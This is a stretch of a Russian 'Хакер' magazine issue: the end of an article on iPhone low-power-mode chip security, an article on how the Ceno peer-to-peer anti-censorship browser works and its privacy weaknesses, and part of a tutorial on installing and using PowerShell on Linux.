 прошивку чипа. Чип NFC — единственный беспроводной чип на iPhone, обла‐
дающий зашифрованной и подписанной прошивкой. Пусть даже и предпри‐
 нимались попытки обойти безопасный загрузчик, они были безуспешны. Чип
UWB  также  предусматривает  защищенную  загрузку, но  его  прошивка
не зашифрована, только подписана. При этом прошивка Bluetooth не зашиф‐
рована и не подписана.  Поскольку у чипа Bluetooth не предусмотрена
 безопасная загрузка, в нем отсутствует корневой доверенный сертификат,
который позволил бы проверить загружаемую прошивку.
    Злоумышленники, не обладающие доступом к устройству на уровне сис‐
 темы, могут попытаться перехватить управление девайсом через чип с под‐
 держкой LPM. Ранее были выявлены различные  уязвимости для серии
 Bluetooth-чипов, используемых в iPhone. Такие уязвимости также существуют
и в других беспроводных чипах. В частности, модуль Find My Phone рассылает
 сообщения по Bluetooth, но не получает данные. Однако экспресс‑режим
 для NFC, а также Bluetooth и UWB для DCK 3.0 допускают обмен данными.
   Даже если бы вся прошивка могла быть защищена от манипуляций, зло‐
 умышленник, обладающий доступом к устройству на уровне системы, все
 равно мог бы отправлять на его чипы собственные команды. Демон Bluetooth
 конфигурирует режим LPM для сети Find My Phone при выключении устрой‐
 ства, для этого используются вендор‑специфичные команды HCI. Эти коман‐
ды выполняют конфигурирование с очень высокой детализацией, в том числе
 позволяют настраивать интервалы ротации широковещательных сообщений
и их содержимое. При помощи этих команд злоумышленник мог бы, к при‐
 меру, установить публичный ключ в качестве содержимого каждого второго
 сообщения так, чтобы этот ключ подходил к аккаунту. После этого атакующий
смог бы найти устройство жертвы, а настоящий пользователь видел бы в сети
 Find My Phone недавнее местоположение своего iPhone, которого там уже
 нет.


ЗАКЛЮЧЕНИЕ
 Поскольку поддержка LPM основана на аппаратной составляющей iPhone, ее
 невозможно удалить при помощи системных обновлений. Соответственно,
она оказывает долгосрочное влияние на всю модель безопасности в iOS.
   По‑видимому, дизайн возможностей LPM в основном строился исходя
 из практических соображений, без учета угроз, возникающих при выходе
 за пределы предусмотренных вариантов применения. Поскольку сеть Find My
Phone продолжает работать и после выключения iPhone, устройства по опре‐
 делению превращаются в инструмент для слежки, а реализация прошивки
 Bluetooth не защищена от манипуляций. Свойства слежения могут быть
 незаметно изменены злоумышленником, заполучившим доступ к устройству
на уровне системы. Более того, современная поддержка цифровых авто‐
 мобильных ключей требует сверхширокой полосы передачи данных в LPM.
   В настоящее время Bluetooth и UWB жестко зашиты в безопасную среду
 (SE), именно в них хранятся автомобильные ключи и другие секреты. Учи‐
 тывая, что прошивка Bluetooth поддается манипуляции, доступ к интерфейсам
SE открывается и из iOS.
   Даже притом, что во многих вариантах применения LPM повышается уро‐
 вень защищенности и безопасности, Apple следовало бы добавить в iPhone
 аппаратный переключатель, который разъединял бы устройство и батарею.
Это улучшило бы ситуацию для лиц, особенно обеспокоенных конфиден‐
 циальностью  данных и  потенциально  подверженных  слежке,  например
 для журналистов.
ПРИВАТНОСТЬ
CENO





   КАК УСТРОЕН МОБИЛЬНЫЙ БРАУЗЕР
        ДЛЯ ОБХОДА ЦЕНЗУРЫ




Вопрос свободного доступа к блокируемо‐
му или подвергаемому цензуре контенту
остро стоит во многих странах. «Хакер» уже
писал о том, как за свободу слова борется
Tor Project. Сегодня мы поговорим об очень       Валентин Холмогоров                                                                           Ведущий редактор "Хакера".
интересной альтернативе для обхода цен‐         valentin@holmogorov.ru
зуры и блокировок — мобильном браузере
Ceno.


Еще со времен «гипертекстового векторного Фидонета» человечество меч‐
тало о децентрализованной сети, предназначенной для свободного обще‐
ния. Хотя вру, конечно. Оно мечтало об этом всегда. Результатом подобных
мечтаний стало, в частности, появление технологий Tor и I2P. Но пытливый
человеческий разум не стоит на месте и со временем изобретает новые
идеи: например,  браузеры, работающие через соединения peer-to-peer
и потому не подверженные цензуре — по крайней мере, согласно задумке их
разработчиков. Одно из таких приложений для Android именно так и называ‐
ется — Censorship No, или, сокращенно, Ceno.


КАК УСТРОЕН СENO
Лежащий в основе Ceno принцип довольно прост. Устройства с установ‐
ленным на них браузером образуют P2P-сеть, которая теоретически позволя‐
ет транслировать трафик за пределы цензурируемой зоны и обходить таким
образом блокировки и запреты. То есть каждое приложение может еще и
выступать в роли бриджа для передачи данных другим устройствам с Ceno.
Как только один пользователь получает доступ к подцензурному или заб‐
локированному контенту, этот контент кешируется и становится доступен дру‐
гим узлам сети Ceno. Именно так это выглядит в теории.
  В основе Ceno лежит Firefox для Android с библиотекой Ouinet, которая
обеспечивает маршрутизацию peer-to-peer и кеширование при просмотре
веб‑страниц.  Когда  использующий  Ouinet  клиент  отправляет  запрос
на получение какой‑либо веб‑страницы, этот запрос транслируется в одно‐
ранговую сеть и страница ищется в распределенном кеше сети, вернее в его
индексе. Если искомый контент там не обнаруживается, запрос перенап‐
равляется доверенному узлу‑инжектору, который транслирует его на спе‐
циальный сервер. Тот получает страницу из интернета и сохраняет ее в кеше.
При следующем запросе этот документ будет загружен уже из Р2Р‑сети. Все
это работает примерно как обычный торрент с одним отличием: юзер может
получать контент без необходимости вылезать во внешний интернет.





  Принцип работы P2P-сети с технологией Ouinet (иллюстрация с сайта
  разработчика)

Разработчики утверждают, что этот подход позволит избавиться от медленно‐
го Tor и VPN, который в любой момент могут заблокировать, а заодно —
сэкономить средства на трафике, особенно в роуминге, где он наиболее
дорогой. Ну и конечно же, речь идет об организации доступа к контенту
в сетях с ненадежным исходящим каналом (но мы‑то понимаем, что именно
они имеют в виду).
   Любопытный нюанс: сами разработчики библиотеки и браузера предуп‐
реждают, что она не может служить в качестве полноценного инструмента
для обеспечения анонимности. Во‑первых, Ouinet передает другим участни‐
кам одноранговой сети информацию о запросах пользователя, просматри‐
ваемых им веб‑страницах и транслируемом на другие узлы сети контенте.
Во‑вторых, само устройство с Ouinet становится фактически прозрачным
прокси. Не очень безопасно, верно?
   Вместе с тем анонимность и обход цензуры — это принципиально разные
категории. Создатели Ceno говорят как раз о второй. Браузер позволяет
получать доступ к контенту в условиях блокировок, ограничений, агрессивной
фильтрации трафика или даже если полностью перекрыт доступ к внешнему
интернету и одновременно внутри страны создан национальный интранет.
Именно так дела обстоят в КНР и Северной Корее, весьма близок к ней
Иран… В общем, не будем продолжать этот список. Разработчик библиотеки
и браузера — компания eQualitie гордо заявляет на своем сайте, что прог‐
рамма была создана с целью поддержки статей 18, 19 и 20 Всеобщей дек‐
ларации прав человека, среди которых перечислены права на свободу мысли,
совести и убеждений.


БРАУЗЕР
С точки зрения пользовательского интерфейса Ceno представляет собой
обычный мобильный Firefox, все «нецензурные» функции спрятаны у него
под  капотом. Для  трансляции  запросов  используется  протокол  HTTP,
для передачи контента — BitTorrent µTP. Шифрование обеспечивается с при‐
менением TLS, для проверки подлинности транслируемых данных задейство‐
ваны цифровые подписи EdDSA в версии Ed25519. При необходимости Ouinet
может использовать вместо µTP транспорт Tor, если в сети пользователя бло‐
кируются торрент‑протоколы.
  Все это вместе приводит к тому, что Ceno генерирует значительно больше
трафика по сравнению с другими мобильными браузерами — ведь ему необ‐
ходимо направлять запросы сразу на множество узлов сети и проксировать
трафик, чтобы передать контент другим пользователям. Поэтому подразуме‐
вается, что браузер будут использовать в сетях с хорошим качеством связи
или нелимитированным трафиком, в которых нет проблем со связью внутри
страны, но имеются сложности с выходом во внешний интернет.


           WARNING

                          Существующая  версия Ceno  работает  только
                       на устройствах с процессорами ARM. Если ты
                        используешь Android на планшете с архитектурой
                       x86 или пытаешься запустить Ceno в эмуляторе
                       без виртуализации железа, ничего не получится.



А ЧТО ПОД КАПОТОМ?
Когда пользователь с установленным на его Android-устройстве Ceno зап‐
рашивает какую‑либо веб‑страницу в интернете, браузер пытается получить
к ней доступ по URL напрямую. Если сделать этого не удается, например зап‐
рос к целевому сайту блокируется, Ceno перенаправляет его в распределен‐
ный индекс P2P-сети. В этом индексе хранятся записи о том, на каком узле
сети  имеется  сохраненная копия целевой  страницы. Индекс  построен
с использованием распределенных хеш‑таблиц DHT (distributed hash table) —
таких же, которые применяются для маршрутизации в обычных торрент‑сетях.
Если искомый контент обнаруживается на каком‑либо устройстве, отправив‐
ший запрос клиент получает пару «IP-адрес:порт» этого девайса. URL в таб‐
лице индекса хранятся в виде хешей, для получения которых используется
специальная криптографическая хеш‑функция. Но что делать, если нужного
контента в Р2Р‑сети нет?
  В этом  случае  клиент  обращается  к  так называемым  инжекторам.
Инжектор — это не деталь в автомобиле, а специальный прозрачный прок‐
си‑сервер, который находится за пределами цензурируемого участка сети
и  старается  оставаться  доступным для  клиентов Ceno.  Трафик  между
инжектором и клиентом шифруется с использованием SSL/TLS, чтобы никто
не  мог  идентифицировать  инжекторы,  прослушивая  трафик. А  чтобы
какой‑нибудь злодей не выдал себя за инжектор, передаваемый контент под‐
писывается цифровой подписью EdDSA.
   Если один из инжекторов вдруг «умрет» или будет заблокирован —
не беда, в сети их много. Разработчики Ceno используют для этого термин
«рой инжекторов». Их адреса также хранятся в распределенных хеш‑таб‐
лицах, и клиент получает их по запросу.
   Если же клиенту не удастся достучаться ни до одного инжектора, он
попытается передать запрос и получить требуемый контент через другие узлы
сети, для которых инжекторы еще доступны. В этом случае транзитные узлы
играют роль мостов, или бриджей, а между клиентом и инжектором формиру‐
ется туннель через промежуточный узел. А поскольку трафик «клиент —
инжектор»  шифруется, бридж не видит, какую именно информацию он
передает.





      Передача данных в сети Ceno (иллюстрация с сайта разработчика)

Перед тем как транслировать контент в P2P-сеть, инжектор подписывает его
своей цифровой подписью. После этого каждый клиент сам может стать
прокси‑сервером и делиться данными из собственного кеша с другими учас‐
тниками сети — валидная подпись инжектора гарантирует, что этот контент
действительно получен из внешнего интернета, а не подделан на внутреннем
узле. Инжекторы используют пару открытого и закрытого ключей для соз‐
дания подписей Ed25519, открытые ключи достаточно малы, чтобы их можно
было отправлять вместе с подписями, и представлены в виде 64 шестнад‐
цатеричных символов или 52 символов в Base32. Разные инжекторы исполь‐
зуют разные ключи, поэтому пользователь может выбирать, каким из них он
доверяет, а каким — нет. Скажем, если инжектор находится в той же стране,
где живет пользователь, но при этом не подвержен цензуре, велик риск, что
такой инжектор контролируется спецслужбами. По умолчанию доверенными
считаются только инжекторы, управляемые компанией eQualitie — разработ‐
чиком браузера, но эту настройку можно изменить.
   Получив запрошенную веб‑страницу, клиент, во‑первых, отображает ее
в браузере Ceno, во‑вторых, сохраняет копию в локальном кеше, а в‑третьих,
вносит в распределенные хеш‑таблицы DHT запись о том, что он располагает
этой самой копией. Время хранения контента в кеше пользователь может
настроить самостоятельно — по умолчанию он содержится там до тех пор,
пока страница не будет замещена более актуальной копией либо пока кеш
не будет очищен.
   Если доступ к внешнему интернету пропал полностью, например работает
на полную катушку национальный файрвол, контент сможет распространяться
только  внутри сети Ceno. При этом, если один  клиент получит копию
какой‑либо веб‑страницы или видеофайла от  другого  клиента, он сам
начинает раздавать этот файл в сеть. Таким образом, контент остается дос‐
тупен, даже если первый узел, на который он был загружен из интернета,
арестован отключился или перестал отвечать на запросы. Аналогично тор‐
рентам, клиенты Ceno могут тянуть файлы сразу из нескольких источников
небольшими порциями, что снижает трафик и повышает доступность кон‐
тента. Так в общих чертах это работает.


ПРОБЛЕМЫ БЕЗОПАСНОСТИ
Как уже упоминалось, связка Ceno + Ouinet обеспечивает доступность кон‐
тента, когда подключение к интернету ограничивают, но отнюдь не аноним‐
ность. При большом желании можно отследить и самих пользователей в сети
Ceno, и просмотреть, чем они делятся с окружающими, поскольку шифруется
трафик только на участке «клиент — инжектор», а на канале «клиент — клиент»
шифрование не используется. Это открывает широкие возможности для про‐
ведения атак типа MITM.
  Из таблиц маршрутизации Ceno можно получить IP-адреса зарегистри‐
рованных в сети устройств, а значит, об анонимности тут нет и речи. А пос‐
кольку девайс с установленным Ceno не только получает, но и раздает кон‐
тент, его владельца вполне можно привлечь за распространение запрещен‐
ной информации. Законодательство некоторых стран это вполне допускает.
  Для обхода столь щепетильного момента браузер Ceno имеет так называ‐
емый режим приватного просмотра. В этом режиме запросы к индексу DHТ
не отправляются, а контент не кешируется. Вместо этого браузер просто
использует инжекторы в качестве прозрачного прокси. При этом инжектор
видит IP-адрес отправившего ему запрос хоста, но не может определить,
конечный это клиент сети или бридж.
  К надежности всей системы тоже есть некоторые вопросы. Поскольку IP-
адреса всех инжекторов в рое нетрудно получить из индекса, их теоретически
можно заблокировать или заддосить. Также  очевидно, что в публичном
режиме просмотра невозможно получить доступ к контенту, требующему
авторизации, поскольку перед отправкой запроса инжектору из него сначала
удаляются логины и пароли, после чего он шифруется, а при возврате данных
клиенту инжектор удаляет оттуда куки. Делается это для того, чтобы приват‐
ные данные не утекли в Р2Р‑сеть. Таким образом, просмотр какого‑либо лич‐
ного контента, вроде своей странички в заблокированной соцсети, возможен
только в приватном режиме.
   Есть и еще один нюанс, не совсем очевидный, но вместе с тем немало‐
важный. Все доверенные инжекторы в сети Ceno принадлежат компании
eQualitie. Можно ли поручить передачу своей информации и собственную
безопасность коммерческой организации, которая разработала и бесплатно
распространяет библиотеку Ouinet, мобильный браузер и источники финан‐
сирования которой неизвестны? Это очень непростой вопрос.


ЛИЧНЫЙ ОПЫТ
Установить Ceno Browser можно из Google Play. В целом мои ожидания под‐
твердились: внешне это вполне обычный Firefox для Android со стандартными
элементами управления. Серфинг проходит тоже вполне традиционно, разве
что страницы загружаются чуть медленнее, чем в обычном мобильном бра‐
узере, но все же вполне шустро. При работе с Ceno я обратил внимание
на  то, что в публичном режиме некоторые новостные  сайты содержат
не самую актуальную информацию в ленте, поскольку подгружаются из кеша.
А вот в режиме приватного просмотра эта проблема исчезла, зато время заг‐
рузки контента ощутимо возросло.





                         Ceno ин экшн

В основе Ceno лежит довольно старая версия Firefox, но авторы обещают
обновить ее, когда основные работы над проектом будут закончены. Тем
не менее использование устаревшего движка, исходники которого уже давно
лежат в открытом доступе, наводит на грустные мысли об уязвимостях.
Но как бы то ни было, софтина работает, недоступные в обычном режиме
сайты открываются, а что до скорости — то с неторопливостью Ceno можно
смириться, особенно если учесть, что при использовании этого браузера
не нужно городить огород с VPN.


ЗАКЛЮЧЕНИЕ
Технология Ceno может быть очень полезна для пользователей, потребля‐
ющих подвергаемый цензуре контент, а также для населения стран, где под‐
ключение к интернету нестабильно, ненадежно или дорого. С помощью одно‐
ранговой P2P-сети организуется своего рода комьюнити, участники которого
помогают друг  другу делиться информацией и преодолевать различные
искусственные ограничения. Тем не менее эта технология не лишена ряда
недостатков, наличие которых  следует  обязательно  учитывать, если ты
решишь установить Ceno на свой Android-смартфон или планшет.
АДМИН
  ИСПОЛЬЗУЙ
     СИЛУ,
     ТУКС!
      ПРИМЕНЯЕМ POWERSHELL
             В LINUX





                                        Андрей Попов
                                                 andpop@mail.ru





«Санкции», «импортозамещение» — эти словечки в пос‐
леднее время все чаще встречаются в прессе и сетевых пуб‐
ликациях. Под давлением обстоятельств некоторые ком‐
пании переходят на Linux и свободное ПО. Когда работаешь
в Linux или используешь две операционные системы сразу,
очень хочется сохранить удобное окружение и привычное
средство автоматизации, роль которого в Windows играет
PowerShell. Можно ли полноценно использовать его в Linux?
Конечно, и сейчас мы разберемся, как.


GUI И CLI
С точки зрения обычного пользователя, ОС — это графическая оболочка
для манипуляций с файловой системой компьютера и запуска различных при‐
ложений. Внешне операционные системы отличаются друг от друга нез‐
начительно, так как графический интерфейс везде состоит из одних и тех же
элементов (окна, кнопки, раскрывающиеся списки и прочее), а файловые
системы построены на одном принципе вложенных каталогов и файлов.
   Поэтому работа с GUI-приложениями в Windows и Linux выглядит одинако‐
во и интуитивно понятна, основные операции выполняются стандартными
способами в более‑менее привычном интерфейсе.
   Продвинутые пользователи и профессионалы для автоматизации работы
пользуются еще одним инструментом, присутствующим в любой десктопной
операционной системе. Это командный интерпретатор (оболочка) и набор
стандартных  утилит,  исполняющихся в  консольном режиме. Командный
интерпретатор решает сразу две задачи:
 • выполнение команд, которые вводятся вручную с помощью интерфейса
   командной строки (Command Line Interface, CLI);
 • поддержка языка программирования для создания скриптов, исполняемых
   в операционной системе.

В отличие от графического интерфейса, CLI-инструменты нельзя назвать
интуитивными. Нужно знать, какие именно команды есть в операционной сис‐
теме, с какими ключами их запускать, как можно комбинировать эти команды
для получения требуемого результата.
   Дело осложняется тем, что в Windows и Linux используются разные коман‐
дные оболочки со своими наборами служебных команд. Это связано как с
принципиальными отличиями в архитектуре ОС, так и с историческими при‐
чинами.


CLI в Linux
В Linux работу с командной строкой поддерживает та или иная модификация
оригинальной оболочки sh операционной системы Unix, обычно это Bash
(Bourne again shell) или Zsh (Z shell).





                          Командная строка в Linux

Функциональность этих командных интерпретаторов и набор консольных ути‐
лит базируются на стандарте POSIX, созданном для обеспечения совмести‐
мости различных Unix-подобных операционных систем. Поэтому во всех
модификациях Linux (как и в операционной системе macOS) используются
одни и те же команды, которые можно соединять друг с другом в програм‐
мные конвейеры, когда текст из выходного потока одной утилиты направля‐
ется на вход другой.
   Многие стандартные команды Linux ориентированы на обработку текста
(grep, sed, awk, sort, cut, tail), так как в Unix-подобных операционных сис‐
темах текстовые данные принято использовать в качестве универсального
представления информации, различные системные настройки и конфигура‐
ции приложений хранятся в обычных текстовых файлах.
  Еще один базовый принцип Unix, перешедший в Linux, выражается фразой
«всё есть файл». Поэтому одни и те же  утилиты можно использовать
для работы как с обычными текстовыми файлами, так и с виртуальными фай‐
лами, представляющими собой каналы  связи программ друг с  другом,
периферийными устройствами и устройствами, эмулирующими ядро опе‐
рационной системы.
   Таким образом, несложные задачи автоматизации в Linux в итоге сводятся
к манипуляциям с файловой системой и обработке текста с помощью име‐
ющихся в системе стандартных команд. Такие задачи удобно решать, пос‐
ледовательно  применяя  несколько  команд,  объединенных  текстовыми
потоками в конвейер.




                          Пример конвейера

Типичный пример: необходимо очистить каталог /tmp от файлов, которые
старше семи дней. Объединяем в конвейер команду find для поиска файлов
и команду rm для их удаления:


find /tmp -type f -name '*' -mtime +7 -print0 | xargs -0 rm -f

В более сложных случаях, когда парой конвейеров не обойтись, пишут сце‐
нарии на поддерживаемом оболочкой древнем командно‑скриптовом языке,
который никак нельзя назвать удобным и интуитивно понятным, или на одном
из универсальных интерпретируемых языков, самый популярный из которых
сейчас — Python.


CLI в Windows
Современные версии Windows базируются на разработанной в начале 1990-х
годов Windows NT, имеющей, в отличие от Unix, API-ориентированную архи‐
тектуру. Операционные системы этого семейства состоят из огромного числа
подсистем и компонентов, доступ к которым организован через специфичес‐
кие API. Для упрощения работы с такой сложной системой управляемые эле‐
менты группируются в структурированные объекты.
  В этом и состоит принципиальное отличие Windows от Unix-подобных сис‐
тем, которые ориентированы на использование текста для представления
всего, что только можно. Инструмент для управления Windows из командной
строки должен не только поддерживать работу с файловой системой и тек‐
стовыми файлами, как в Unix-системах, но и обеспечивать простой и еди‐
нообразный доступ к свойствам и методам множества внутренних объектных
моделей Windows (.NET Framework, WMI, WSH, ADSI, CDO и так далее).
   Стандартный командный интерпретатор cmd.exe, появившийся в Windows
NT и благополучно доживший до последних версий Windows, не имел такой
возможности, его основной задачей было обеспечивать обратную совмести‐
мость с командным интерпретатором command.com предыдущей операци‐
онной системы MS-DOS, в которой не было никаких внутренних объектных
систем. По возможностям оболочки cmd.exe и составу системных консоль‐
ных утилит Windows всегда уступала Unix-подобным системам. Основные уси‐
лия разработчиков направлялись на улучшение графической оболочки, а не
на командную строку.
  Для решения этих проблем Microsoft в начале 2000-х разработала новую
оболочку и среду выполнения сценариев Windows PowerShell, которая впи‐
тала в себя удачные решения из других оболочек и скриптовых языков.
PowerShell обеспечивает прямой доступ из командной строки к внутренним
объектам системы и позволяет работать с различными источниками данных
(например, с системным реестром или хранилищем сертификатов) по прин‐
ципу файловой системы. Внутренний набор команд PowerShell можно допол‐
нять собственными командами, которые полностью интегрируются в оболоч‐
ку.
  От всех других оболочек командной строки PowerShell отличает главная
особенность — ее ориентация на объекты. Команды PowerShell, которые при‐
нято называть командлетами, взаимодействуют друг с другом не с помощью
символьных строк, а через объекты. Поэтому работать в PowerShell становит‐
ся проще, чем в традиционных оболочках: не нужно дополнительно ничего
делать, чтобы выделить информацию из символьного потока.




                      Последовательность командлетов

Например, нужно получить упорядоченный по количеству затраченного про‐
цессорного времени  список  процессов, идентификаторы которых боль‐
ше 1000. Это делается конвейером из трех команд, назначение которых оче‐
видно из их названий:


Get-Process | Where-Object Id -gt 1000 | Sort-Object cpu -Descending

Для поддержки объектов разработчики PowerShell воспользовались объ‐
ектной моделью .NET Framework. Таким образом, язык PowerShell относится
к .NET-языкам программирования (как C#), и при этом он совершенно
не похож на другие. Это командно‑скриптовый язык, позволяющий сов‐
мещать в сценариях императивный и декларативный стили программирова‐
ния.


Объединение миров Windows и Linux
Итак, в Windows и Linux живут совершенно разные командные оболочки,
однако  стараниями  Microsoft  стало возможным  работать  с  привычной
для себя оболочкой в любой системе:
 • Bash в Windows. С помощью подсистемы WSL (Windows Subsystem for
   Linux) можно установить из Microsoft Store один из дистрибутивов Linux
   и пользоваться его командной оболочкой для работы с файловой сис‐
   темой Windows или запуска Windows-утилит. Также в этом случае можно
   будет запускать утилиты Linux в командной строке Windows.
 • PowerShell в  Linux. В 2017 году  Microsoft  открыла исходный код
   PowerShell, теперь это Open Source проект (вот репозиторий на GitHub).
   Оболочка, использующая .NET Core, стала кросс‑платформенной, с ней
   можно работать в различных дистрибутивах Linux (Debian, Ubuntu, CentOS,
  Red Hat, openSUSE, Fedora) и в macOS.

Вначале кросс‑платформенная версия оболочки называлась PowerShell Core
6, чтобы явно указать ее зависимость от .NET Core. Начиная с седьмой вер‐
сии слово Core из названия убрали, теперь оболочка носит имя просто
PowerShell. Версия оболочки, базирующаяся на полной платформе Windows
.NET Framework, называется Windows PowerShell.


УСТАНОВКА И ЗАПУСК
Установка PowerShell зависит от типа операционной системы и ее версии,
соответствующие  инструкции  имеются  на  сайте  Microsoft.  Например,
для установки PowerShell в операционной системе Linux Ubuntu 20.04 нужно
выполнить следующие команды:


sudo apt-get update
sudo apt-get install -y wget apt-transport-https software-properties-
common
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-
microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt-get update
sudo add-apt-repository universe
sudo apt-get install -y powershell

Чтобы запустить установленную оболочку PowerShell, выполним в терминале
команду pwsh. После вывода информации о версии PowerShell мы получим
обычное приглашение командной строки с путем к текущему каталогу в качес‐
тве префикса.





                             PowerShell в Linux




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИАДМИН
    ИСПОЛЬЗУЙ СИЛУ,
                ТУКС!
                ПРИМЕНЯЕМ POWERSHELL В LINUX





POWERSHELL КАК КОМАНДНАЯ ОБОЛОЧКА
Для эффективной и удобной работы в командной строке важны два момента.
 1. Нужно знать названия команд и их ключей. Запомнить их будет проще,
   если синтаксис команд интуитивно понятен и однороден. Если мы не пом‐
  ним ключи у команды, то должна быть возможность быстро найти справку
   по этой команде и примеры ее использования.
 2. Сами команды и их ключи должны быть краткими и удобными для быстрого
   набора на клавиатуре. Оболочка должна поддерживать механизмы авто‐
   дополнения, поиска и повтора выполнявшихся ранее команд.

Если со вторым пунктом у стандартных оболочек Linux все хорошо, то пох‐
валиться понятностью имен и ключей команд они не могут: названия многих
утилит представляют собой аббревиатуры, придуманные еще в 1960-е годы,
а одни и те же ключи в разных командах могут иметь разный смысл.
В PowerShell такой проблемы нет.


Структура команд и псевдонимы
В PowerShell имена всех внутренних команд соответствуют шаблону «дей‐
ствие‑объект», например Get-Process (получить информацию о процессе),
Get-Content (получить содержимое файла), Clear-Host (очистить экран).
Для одинаковых параметров команд используются стандартные имена, струк‐
тура параметров во всех командах идентична, все команды обрабатываются
одним синтаксическим анализатором. Это делает семантику команд очевид‐
ной  и  значительно  упрощает  запоминание  и  использование  команд
PowerShell.
  С другой стороны, иногда PowerShell ругают именно за этот многословный
и необычный для других оболочек синтаксис. Например, нам нужно создать
в текущем каталоге пустой файл 1.txt. В Bash это делается командой touch
из пяти букв:


~ touch 1.txt

При создании файла в PowerShell с помощью команды New-Item с парамет‐
рами потребуется ввести больше двадцати символов.





            Создание файла 1.txt c помощью команды New-Item

Выглядит ужасно, правда? Но того же результата можно добиться, набрав
команду ni всего из двух символов.





               Создание файла 2.txt c помощью команды ni

Команда ni — это стандартный псевдоним для New-Item (сокращение
по первым буквам слов команды), значение File для параметра -Type
используется по умолчанию, имя параметра -Path можно опустить.
   Таким образом,  стандартные псевдонимы PowerShell, полный  список
которых можно получить с помощью команды Get-Alias, помогают быстро
вводить команды и создавать компактные и лаконичные конвейеры из нес‐
кольких команд.





    Получение полного списка псевдонимов c помощью команды Get-Alias

Отметим, что в Windows PowerShell за некоторыми командлетами закреплены
псевдонимы, соответствующие стандартным командам Unix-подобных сис‐
тем: ls, rm, cp, mv, cat, ps, man, mount. В PowerShell 6/7 данные псевдонимы
не определены, их ввод приведет к выполнению «родных» команд Linux.


Доступность команд
В .NET Core/.NET 5 реализована не вся функциональность платформы .NET
Framework, поэтому в PowerShell 6/7 по умолчанию загружается меньше
модулей и будет доступно меньше команд, чем в Windows PowerShell. Нап‐
ример, под Linux недоступны команды *-Service, *-Acl, *-Event, Set-
ExecutionPolicy.
   Часть из отсутствующих модулей напрямую связаны с особенностями опе‐
рационной системы Windows и не могут быть перенесены на другие плат‐
формы (так, в PowerShell для Linux отсутствуют провайдеры и виртуальные
диски для  системного  реестра и  хранилища  сертификатов), некоторые
модули могут быть добавлены в следующих версиях PowerShell.
  При работе с PowerShell в Linux необходимо учитывать особенности опе‐
рационной системы.
 • Зависимость от регистра символов. Сама оболочка PowerShell, как и
   операционная система Windows, не зависит от регистра символов. Нап‐
   ример, имена $a и $A обозначают одну и ту же переменную, название
   командлетов можно писать в любом  регистре  (Get-Process, get-
  process или GET-PROCESS), в путях к файлам и каталогам в Windows тоже
   можно  использовать  символы  в  разных  регистрах   (C:\Windows,
  c:\windows или C:\WINDOWS). Напротив, в Linux важен регистр сим‐
   волов в путях к каталогам и файлам или в именах переменных среды.
   Поэтому для запуска сценариев, загрузки модулей и корректной работы
   автодополнения файловых путей в этих системах нужно писать точные
   имена  с  учетом  регистра  символов.  Названия  самих  командлетов
   и переменных PowerShell по‑прежнему от регистра не зависят.
 • Разделители в путях файловой системы. В Windows в качестве раз‐
   делителей в путях к файлам и каталогам можно использовать символы
   слеша / и обратного слеша \. В Linux используется только символ слеша /.
 • Запуск команд от имени суперпользователя (sudo). Для выпол‐
   нения какой‑либо одной команды с привилегиями суперпользователя root
   в оболочке Linux используется команда sudo. В сеансе работы PowerShell
   напрямую применить sudo не получится, нужно с ее помощью запустить
   новый экземпляр оболочки, и все команды PowerShell будут выполняться
   от имени суперпользователя.


Справочная система
При работе с интерактивной командной оболочкой важно иметь под рукой
подробную и удобную  справочную систему с описанием возможностей
команд и примерами их применения. В PowerShell такая система имеется,
в Linux она работает так же, как в Windows, с помощью команды Get-Help.





                             Справочная система

Подробная справочная информация о командах PowerShell (описания каж‐
дого из параметров команды, замечания и примеры запуска команды с раз‐
личными параметрами и  аргументами)  хранится в интернете на  сайтах
Microsoft. С помощью команды Update-Help можно загрузить справочные
файлы на свою машину, чтобы обращаться к ним быстрее:


Update-Help -Force -UICulture en-US

Отметим, что командлет Get-Help позволяет просматривать справочную
информацию не  только о  разных  командах, но и о  синтаксисе  языка
PowerShell, о псевдонимах, функциях, скриптах и других аспектах работы обо‐
лочки. Список тем, обсуждение которых представлено в справочной службе
PowerShell, можно увидеть с помощью команды Get-Help about_*.





                     Вывод команды Get-Help about_


Работа в командной строке
При  запуске PowerShell  автоматически  загружается модуль PSReadLine,
обеспечивающий удобную интерактивную работу в командной строке.
   Названия командлетов, параметров и переменных, ключевые конструкции
и другие элементы языка PowerShell при вводе в командную строку отобража‐
ются разными цветами. Если при наборе команды получается синтаксически
неверная конструкция (например, мы забыли поставить закрывающую скобку
или не написали команду после знака конвейера), то последний знак >
в приглашении командной строки становится красным.





                  Мы где‑то ошиблись

В PowerShell поддерживается автоматическое завершение имен команд, их
параметров и путей к файлам и каталогам. Для этого используется клавиша
Tab. Например, если набрать символы get-p и нажать Tab, то в командной
строке появится команда Get-Process.
   Если для завершения возможны  несколько  вариантов, то они будут
выведены все, а ввод команды продолжится. Таким образом, при вводе
команды можно узнать все ее возможные параметры, даже не обращаясь
к справочной системе (в стандартных оболочках Linux такой возможности
нет).





                Просмотр параметров при вводе команды

Если ты помнишь только часть команды (необязательно сначала), то по ней
можно найти подходящие варианты среди тех команд, которые выполнялись
в оболочке раньше. По умолчанию интерактивный поиск в таком режиме акти‐
вируется нажатием клавиш Ctrl + r (поиск по истории команд назад) или Ctrl +
s (поиск по истории команд вперед).





                          Поиск по истории команд

При наборе команды PowerShell может cразу выдавать подходящий вариант
из списка вводившихся команд, который можно принять одним нажатием
стрелки  вправо.  Активируется  этот режим следующей  командой: Set-
PSReadLineOption -PredictionSource 'History'.





            Включение режима автозавершения ввода команд

Текущие сочетания клавиш, назначенные в PSReadLine для выполнения дей‐
ствий, можно посмотреть с помощью команды Get-PSReadlineKeyHandler.





                Просмотр текущего списка горячих клавиш

Изменить сочетания клавиш позволяет команда Set-PSReadlineKeyHandler.
Например,  назначим  клавишам  со  стрелками  вверх  и  вниз  функции
HistorySearchBackward    (поиск    назад    по    истории    команд)
и HistorySearchForward (поиск вперед по истории команд) соответственно.





                      Переназначение горячих клавиш

Теперь можно будет подставлять в командную строку команды из истории,
набрав в командной строке их начальные символы и нажимая стрелку вверх
или вниз.
   Чтобы не набирать при каждом запуске PowerShell команды для настройки
PSReadLine, их нужно поместить в свой профиль — это скрипт, который авто‐
матически выполняется при каждом запуске PowerShell. Путь к профилю хра‐
нится в переменной $PROFILE.





                          Скрипт $PROFILE


ВЫВОДЫ
